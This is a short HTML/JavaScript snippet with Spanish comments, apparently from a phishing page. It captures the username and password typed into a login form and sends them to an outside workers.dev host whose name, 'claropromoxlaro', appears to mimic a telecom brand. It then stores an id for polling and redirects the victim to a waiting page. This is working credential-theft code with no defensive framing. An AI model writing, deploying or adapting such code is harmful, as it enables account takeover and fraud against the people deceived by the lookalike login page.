<script>
  document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const usuario = document.getElementById("usuario").value;
    const clave = document.getElementById("clave").value;

    const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({usuario, clave})
    });
    const data = await res.json();
    if(data.ok){
      localStorage.setItem("login_id", data.id); // Guardamos id para polling
      window.location.href = "esperando.html";   // Redirigimos a la p√°gina de espera
    } else {
      alert("Error al enviar");
    }
  });
</script>
